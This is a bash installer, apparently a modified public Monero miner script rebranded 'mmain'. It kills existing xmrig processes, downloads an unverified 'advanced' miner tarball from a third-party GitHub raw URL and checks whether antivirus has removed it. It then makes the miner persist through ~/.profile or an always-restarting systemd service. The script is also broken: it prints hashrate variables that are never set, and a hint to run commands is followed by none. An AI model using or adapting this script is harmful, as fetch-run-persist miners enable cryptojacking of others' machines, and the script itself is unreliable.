#!/bin/bash

VERSION=2.11

# printing greetings

echo "mmain mining setup script v$VERSION."
echo "(please report issues to support@mmain.stream email with full output of this script with extra \"-x\" \"bash\" option)"
echo

if [ "$(id -u)" == "0" ]; then
  echo "WARNING: Generally it is not adviced to run this script under root"
fi

# command line arguments
WALLET=$1

# checking prerequisites

if [ -z $WALLET ]; then
  echo "Script usage:"
  echo "> setup_mmain_miner.sh <wallet address>"
  echo "ERROR: Please specify your wallet address"
  exit 1
fi

WALLET_BASE=`echo $WALLET | cut -f1 -d"."`
if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
  echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
  exit 1
fi

if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if ! type curl >/dev/null; then
  echo "ERROR: This script requires \"curl\" utility to work correctly"
  exit 1
fi

if ! type lscpu >/dev/null; then
  echo "WARNING: This script requires \"lscpu\" utility to work correctly"
fi

# printing intentions

echo "I will download, setup and run in background Monero CPU miner."
echo "If needed, miner in foreground can be started by $HOME/mmain/miner.sh script."
echo "Mining will happen to $WALLET wallet."
echo

if ! sudo -n true 2>/dev/null; then
  echo "Since I can't do passwordless sudo, mining in background will started from your $HOME/.profile file first time you login this host after reboot."
else
  echo "Mining in background will be performed using mmain_miner systemd service."
fi


echo
echo "JFYI: This host has $CPU_THREADS CPU threads, so projected Monero hashrate is around $EXP_MONERO_HASHRATE KH/s."
echo

echo "Sleeping for 15 seconds before continuing (press Ctrl+C to cancel)"
sleep 15
echo
echo

# start doing stuff: preparing miner

echo "[*] Removing previous mmain miner (if any)"
if sudo -n true 2>/dev/null; then
  sudo systemctl stop mmain_miner.service
fi
killall -9 xmrig

echo "[*] Removing $HOME/mmain directory"
rm -rf $HOME/mmain

echo "[*] Downloading mmain advanced version of xmrig to /tmp/xmrig.tar.gz"
if ! curl -L --progress-bar "https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download https://raw.githubusercontent.com/ardx2/1/main/mmain.tar.gz file to /tmp/xmrig.tar.gz"
  exit 1
fi

echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmain"
[ -d $HOME/mmain ] || mkdir $HOME/mmain
if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmain; then
  echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmain directory"
  exit 1
fi
rm /tmp/xmrig.tar.gz

echo "[*] Checking if advanced version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
$HOME/mmain/xmrig --help >/dev/null
if (test $? -ne 0); then
  if [ -f $HOME/mmain/xmrig ]; then
    echo "WARNING: Advanced version of $HOME/mmain/xmrig is not functional"
  else 
    echo "WARNING: Advanced version of $HOME/mmain/xmrig was removed by antivirus (or some other problem)"
  fi

  echo "[*] Looking for the latest version of Monero miner"
  LATEST_XMRIG_RELEASE=`curl -s https://github.com/xmrig/xmrig/releases/latest  | grep -o '".*"' | sed 's/"//g'`
  LATEST_XMRIG_LINUX_RELEASE="https://github.com"`curl -s $LATEST_XMRIG_RELEASE | grep xenial-x64.tar.gz\" |  cut -d \" -f2`

  echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
  if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
    echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
    exit 1
  fi

  echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/mmain"
  if ! tar xf /tmp/xmrig.tar.gz -C $HOME/mmain --strip=1; then
    echo "WARNING: Can't unpack /tmp/xmrig.tar.gz to $HOME/mmain directory"
  fi
  rm /tmp/xmrig.tar.gz

  echo "[*] Checking if stock version of $HOME/mmain/xmrig works fine (and not removed by antivirus software)"
  $HOME/mmain/xmrig --help >/dev/null
  if (test $? -ne 0); then 
    if [ -f $HOME/mmain/xmrig ]; then
      echo "ERROR: Stock version of $HOME/mmain/xmrig is not functional too"
    else 
      echo "ERROR: Stock version of $HOME/mmain/xmrig was removed by antivirus too"
    fi
    exit 1
  fi
fi

echo "[*] Miner $HOME/mmain/xmrig is OK"

echo "[*] Creating $HOME/mmain/miner.sh script"
cat >$HOME/mmain/miner.sh <<EOL
#!/bin/bash
if ! pidof xmrig >/dev/null; then
  nice $HOME/mmain/xmrig \$*
else
  echo "Monero miner is already running in the background. Refusing to run another one."
  echo "Run \"killall xmrig\" or \"sudo killall xmrig\" if you want to remove background miner first."
fi
EOL

chmod +x $HOME/mmain/miner.sh

echo "[*] Creating $HOME/mmain/config_background.json"
cp $HOME/mmain/config.json $HOME/mmain/config_background.json

if ! sudo -n true 2>/dev/null; then
  if ! grep mmain/miner.sh $HOME/.profile >/dev/null; then
    echo "[*] Adding $HOME/mmain/miner.sh script to $HOME/.profile"
    echo "$HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1" >>$HOME/.profile
  else 
    echo "Looks like $HOME/mmain/miner.sh script is already in the $HOME/.profile"
  fi
  echo "[*] Running miner in the background (see logs in $HOME/mmain/xmrig.log file)"
  /bin/bash $HOME/mmain/miner.sh --config=$HOME/mmain/config_background.json >/dev/null 2>&1
else
  echo "[*] Creating mmain_miner systemd service"
  cat >/tmp/mmain_miner.service <<EOL
[Unit]
Description=Monero miner service

[Service]
ExecStart=$HOME/mmain/xmrig --config=$HOME/mmain/config.json
Restart=always

[Install]
WantedBy=multi-user.target
EOL
  sudo mv /tmp/mmain_miner.service /etc/systemd/system/mmain_miner.service
  echo "[*] Starting mmain_miner systemd service"
  sudo killall xmrig 2>/dev/null
  sudo systemctl daemon-reload
  sudo systemctl enable mmain_miner.service
  sudo systemctl start mmain_miner.service
  echo "To see miner service logs run \"sudo journalctl -u mmain_miner -f\" command"

echo ""
echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usage produced by the miner or you will be banned"

  echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"

fi
echo ""

echo "[*] Setup complete"
